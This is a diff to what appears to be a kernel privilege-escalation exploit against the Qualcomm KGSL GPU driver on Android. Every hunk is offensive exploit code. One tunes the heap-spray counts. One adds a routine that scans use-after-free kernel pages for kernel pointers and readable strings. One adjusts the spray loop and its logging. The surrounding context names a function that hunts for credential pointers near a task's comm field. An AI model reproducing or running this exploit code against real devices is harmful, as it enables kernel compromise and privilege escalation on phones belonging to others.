@@ -125,9 +125,9 @@ uint8_t sig_num[] = {1, 3, 5, 7, 9};
 
 #define KGSL_IOC_TYPE 0x09
 #define FINDING 10
-#define SPRAY_COUNT 8000
+#define SPRAY_COUNT 7000
 #define SPRAY_COUNT_STEP 1000
-#define SPRAY_COUNT_MAX 8000
+#define SPRAY_COUNT_MAX 7000
 #define KGSL_MEMFLAGS_USE_CPU_MAP 0x10000000ULL
 #define KGSL_USER_MEM_TYPE_ADDR 0x00000002U
 
@@ -1601,6 +1601,34 @@ static int find_cred_pointers_near_comm(int fd, uint64_t task_va, uint8_t *task_
     return 0;
 }
 
+static void analyze_uaf_page(uint8_t *data, uint64_t va) {
+    int kptrs = 0;
+    int strings = 0;
+    char found_str[16] = {0};
+    
+    for (int i = 0; i < 512; i++) {
+        uint64_t val = ((uint64_t*)data)[i];
+        if ((val & 0xffffffc000000000ULL) == 0xffffffc000000000ULL) kptrs++;
+    }
+    
+    for (int i = 0; i < 4096 - 8; i++) {
+        if (data[i] >= 0x20 && data[i] <= 0x7e) {
+            int len = 0;
+            while (i + len < 4096 && data[i+len] >= 0x20 && data[i+len] <= 0x7e && len < 15) len++;
+            if (len >= 4) {
+                strings++;
+                if (found_str[0] == 0) memcpy(found_str, data + i, len > 15 ? 15 : len);
+                i += len;
+            }
+        }
+    }
+    
+    if (kptrs > 0 || strings > 0) {
+        fprintf(stderr, "\n[DATA] VA:0x%lx | K-PTRs:%d | STRs:%d | Sample:\"%s\"", 
+                (unsigned long)va, kptrs, strings, found_str);
+    }
+}
+
 static int scan_uaf_for_nonzero_multi(int fd, struct nonzero_page *found_pages, int *num_found)
 {
     unsigned int ctx_id = 0, ib_id = 0, dst_id = 0;
@@ -1753,8 +1781,8 @@ static int scan_uaf_for_nonzero_multi(int fd, struct nonzero_page *found_pages, 
                     break;
                 }
             }
-            if (has_data && pages_scanned % 64 == 0) {
-                fprintf(stderr, "v"); // 'v' for non-zero data (valuable)
+            if (has_data && pages_scanned % 128 == 0) {
+                analyze_uaf_page(bytes, current_va);
             }
 
             pages_scanned++;
@@ -2603,10 +2631,11 @@ restart:;
                 snprintf((char *)spray_heap, PAGE_SIZE, "%s%05d", MARKER_NAME, self);
                 for (size_t j = 0; j < PAGE_SIZE * 4; j += PAGE_SIZE)
                     ((volatile uint8_t *)spray_heap)[j] = 0x11;
-                fprintf(stderr, "[SPRAY %d] Allocated spray heap at %p\n", i, spray_heap);
             }
 
-            fprintf(stderr, "[SPRAY %d] Started, PID=%d, name=%s\n", i, self, proc_name);
+            if (i % 1000 == 0) {
+                fprintf(stderr, "[SPRAY %d] Started, PID=%d\n", i, self);
+            }
 
             while (1)
             {
